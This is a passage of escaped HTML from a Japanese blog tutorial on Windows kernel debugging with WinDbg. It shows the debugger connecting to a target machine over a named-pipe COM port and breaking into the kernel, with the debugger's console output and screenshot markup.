            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/4ee28ac0fb172f16033a6266f6071c7a/0b533/image-13.png&quot;
            alt=&quot;image-13.png&quot;
            title=&quot;image-13.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ここまで完了したところで[OK]をクリックすると、カーネルデバッグ用のCommandウィンドウが起動し、COMポートへの接続を待機し始めます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;Waiting &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; pipe \\&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;\pipe\com1
Waiting to reconnect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最後に、ターゲット側のWindowsマシンを再起動します。&lt;/p&gt;
&lt;p&gt;すると、以下の画面のようにWinDbgがターゲットマシンに接続され、ターゲットマシンがテストモードで起動しました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/5909177960178f54921d390b555c8b13/0b533/image-10.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 59.583333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAARlAAAEZQAGA43XUAAACu0lEQVQoz42SW0hUURSG95zxFpGWUJGYqaljVuIY5KUUK5HQxocsU0tLyKCyvBX2JkFUL0EUlpcMnehCWeB1gnzo8tBbotltAoNgTHMyndFRnNGvfQ5ZEBEd+FiHtc/511p7/cJmG8JuH2VkZISxsTFGR0dxOh1Mu1zMzMzgknF6elrDpeL6zZQ8m52dpa+vj9bWVtrb2xEDAwMMDg4yPDwshZzaj+pHHo+Hubk5/uf5MmTj+bOnGsJqtWKz2TTsdjsOh4PJyUkp5uGr/RuNzXclt7lSb+Zqwy3qm+9R13yfOvND6loeUC+pbbrD5est1Da0INxut1Zlfn7+V0XPz87631rxj9iGX1gyIjAWsSQGEbABsSwOsSJJ5uIR/jLnvw7hF0mIMQOhjrcguMDCqAMfPrE8oRARnIISth0lfAfK2gwUwy6UjXkomw6jk+ijdiFWbcGQuu/fgm+sn1iVXY6IMqFbvwdhPIiSdBxl53l0+c3oj7TjXd2LV00/IusiUZllfxdUF6IJvrMSmyaFDNkI2ZGIL8Y7tRLfvCaU6n70tRME3HOy++U8sTUWQjNOIP61yfcfB4lMMiFWp6IzmDRBr21n8M5tRKnqRVEFH01R3DtH8tlOQtKPIVTvjY+PMzExoW1XxeFw4nbP8qrvNeuTMxFBiejC0hExOYgk2UXWJUTRfZTyF/hc+Exg43d8DpmJzJTX09XVRWdnJ2q0WCwa3d3d9PQ84cbNFowpJpSV8ShBm1FCUtCvTUcfnY3eWIR+ayVKxjl0ibJIuImo7UWIjo4OFlCdrsa2tjYeP7ZQe62B6Lg0aYk1CN8QxKIw+R4hbSKts9SIWCzt4iPzvsEI71AMCXIatbs/UUXVTs3mWxwrLaO88jRlFVWUnixn/8ESCkuOkltQRG7eAbJz8snMOYBpbwEVlaf4AZpplz8gK+T/AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/5909177960178f54921d390b555c8b13/8ac56/image-10.webp 240w,
/static/5909177960178f54921d390b555c8b13/d3be9/image-10.webp 480w,
/static/5909177960178f54921d390b555c8b13/b0a15/image-10.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/5909177960178f54921d390b555c8b13/8ff5a/image-10.png 240w,
/static/5909177960178f54921d390b555c8b13/e85cb/image-10.png 480w,
/static/5909177960178f54921d390b555c8b13/0b533/image-10.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/5909177960178f54921d390b555c8b13/0b533/image-10.png&quot;
            alt=&quot;image-10.png&quot;
            title=&quot;image-10.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これで、WinDbgでWindowsのカーネルデバッグを実施する準備が完了しました。&lt;/p&gt;
&lt;h2 id=&quot;windbgでカーネルデバッグを行う&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg%E3%81%A7%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%82%92%E8%A1%8C%E3%81%86&quot; aria-label=&quot;windbgでカーネルデバッグを行う permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbgでカーネルデバッグを行う&lt;/h2&gt;
&lt;p&gt;WinDbgがCOMポート経由でターゲットマシンに接続したことで、カーネルデバッグの準備が整いました。&lt;/p&gt;
&lt;p&gt;しかし、現在はターゲットマシンのWindowsOSが稼働しているため、WinDbgのCommandウィンドウによる操作を行うことができません。&lt;/p&gt;
&lt;p&gt;WinDbgでカーネルデバッグを進めるためには、一度Windowsカーネルを停止する必要があります。&lt;/p&gt;
&lt;h3 id=&quot;windbgからカーネルを停止する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg%E3%81%8B%E3%82%89%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%82%92%E5%81%9C%E6%AD%A2%E3%81%99%E3%82%8B&quot; aria-label=&quot;windbgからカーネルを停止する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbgからカーネルを停止する&lt;/h3&gt;
&lt;p&gt;カーネルデバッグのためにWindowsカーネルを停止するには、WinDbg上部のツールバーから[Break]ボタンをクリックするか、[Ctrl+Break]キーを押して下さい。&lt;/p&gt;
&lt;p&gt;または、WinDbg上部の[Debug]メニューから[Break]を選択することでも停止が可能です。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 426px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/ff4901184468bdbffd12fe366e0a50f0/531e1/image-14.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 104.16666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAVCAYAAABG1c6oAAAACXBIWXMAAAsTAAALEwEAmpwYAAADqElEQVQ4y21Ua2/bRhDk///aD0WBfmiRAm1ToCkSoCiQBq2jxKlsvSzqQVLi+yG+RZGSLBu1prsrU3GNCFgcJN3Nzc7MnnI9mcJ3XRR5jjzLkMQxqpLWyMcqCpEXObIsQUr/lesCfuAjDCKkaYokSZDTubIs4HkB0jiCkpU1mrrBel1ht22QrBtcGTH6ZgY/ShCFITabCvEqpnWD/X6Pptni9vZW6nA44O7uDrvdHneHWygfO29x1b3EoN9H76qL3nCMkRmjp/lIskIY13RhnuWoqg3u7+/PYAzO63a7pUtqujyB8u13X+OHn37Gy1/f4MWPv+D3P97isGsQBx61FkpLMYGmaSZrkqTY1DU2VUUXVMK6KAppu9cfEuDrPr562cE3v3Xx/Z8a3nxaCBPf86DrBtQbFVN1gvlsDnWsEouI2DQCxOuJ3Rb31O5obkN51+lC1UyM50tMdBuWF6GmjWyUsVjAdVzR0fd9BH5wBquJJZsYx4kw507CKIbSvephaeiYTSewLZPEj8igNbnmYj6fkcPZqTVizWwYrAVcRREWxpLOTuXCjJxXOpddjEYjmKaFsapiNpsJgMsMqeUpxUodj+HYroC0gFx8AV/o2DbiJJYYKRcdcnjQh2EYAmxZFira7Di2gFumCV3TiMnizKwt/r4uSzLkVAyuvP9wifH4RgxYLpfUqvfYskdgFra73WeAR2dbd9flGjbt0XSdWDrStnJBgLquwSRmzEgjNrw5DANhx9Hh7y3I02KD0jQRvaNoReasoPx10UGvd40pCTscDglcl43c+oQ0ZW2F4bN225Z5TUk/y7KRsCnvP3zCiIBGoxsENKfMkseQTWHt/OBzVJ7XlkbVcz25PCTHRcO/Ox/Ru74WHQaDAQV4hl1dSSQ8Al2tVrQx/yIgPxCsNbfMYJ5HGtquj+PDg4zPngwoNw0GLgE+BlYCTTrWTwLdasph5nNcbBBfoExmGvjDr4VB5rzr/INX6gYm5c4k1zku5tIUBlmeyVoU5f+0ZElESwY0HQ8PD//KD8zGJj0Ou1r05GyyRgzIITdpkjRNl9Z4f/UkRlyi4WRuEL+jpL59jiqJTUjhdk7RIT0beQSaM5vnevJvfEZZWo60fDweH1vfnUdPoxfGorEqKeithl/K43m2yUClN7yhw460x5PCK7OI6U+bsuXT087mcLVhfp7HlnFEnSgLYsiTElDemDKD8mFD5xdoJprxA8Hv4cnx076nxUD8H0v0HysIC+BNy+NRAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/ff4901184468bdbffd12fe366e0a50f0/8ac56/image-14.webp 240w,
/static/ff4901184468bdbffd12fe366e0a50f0/dca0e/image-14.webp 426w&quot;
              sizes=&quot;(max-width: 426px) 100vw, 426px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/ff4901184468bdbffd12fe366e0a50f0/8ff5a/image-14.png 240w,
/static/ff4901184468bdbffd12fe366e0a50f0/531e1/image-14.png 426w&quot;
            sizes=&quot;(max-width: 426px) 100vw, 426px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/ff4901184468bdbffd12fe366e0a50f0/531e1/image-14.png&quot;
            alt=&quot;image-14.png&quot;
            title=&quot;image-14.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;すると、次のような出力の後にCommandウィンドウから操作が可能になります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;Connected to Windows 10 10586 x64 target at &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Mon Oct  4 17:32:25&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;121 2021 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;UTC &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; 9:00&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ptr64 TRUE
Kernel Debugger connection established&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
Symbol search path is: srv*
Executable search path is: 
Windows 10 Kernel Version 10586 &lt;span class=&quot;token function&quot;&gt;MP&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;1 procs&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; Free x64
Edition build lab: 10586&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;162&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;amd64fre&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;th2_release_sec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;160223-1728
Machine Name:
Kernel base = 0xfffff803`5280b000 PsLoadedModuleList = 0xfffff803`52ae9cd0
System Uptime: 0 days 0:00:00&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;121
KDTARGET: Refreshing KD connection
&lt;span class=&quot;token keyword&quot;&gt;Break&lt;/span&gt; instruction exception &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; code 80000003 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;first chance&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;                                                                             &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;   You are seeing this message because you pressed either                    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;       CTRL+C &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; you run console kernel debugger&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; or&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;                       &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;       CTRL+&lt;span class=&quot;token keyword&quot;&gt;BREAK&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; you run GUI kernel debugger&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;                          &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;   on your debugger machine&apos;s keyboard&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;                                      &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;                                                                             &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;                   THIS IS NOT A BUG OR A SYSTEM CRASH                       &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;                                                                             &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;If&lt;/span&gt; you did not intend to &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt; into the debugger&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; press the &lt;span class=&quot;token string&quot;&gt;&quot;g&quot;&lt;/span&gt; key&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; then   &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; press the &lt;span class=&quot;token string&quot;&gt;&quot;Enter&quot;&lt;/span&gt; key now&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;  This message might immediately reappear&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;token keyword&quot;&gt;If&lt;/span&gt; it &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; does&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; press &lt;span class=&quot;token string&quot;&gt;&quot;g&quot;&lt;/span&gt; and &lt;span class=&quot;token string&quot;&gt;&quot;Enter&quot;&lt;/span&gt; again&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;                                          &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;                                                                             &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
nt!DbgBreakPointWithStatus:
fffff803`52952eb0 cc              int     3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
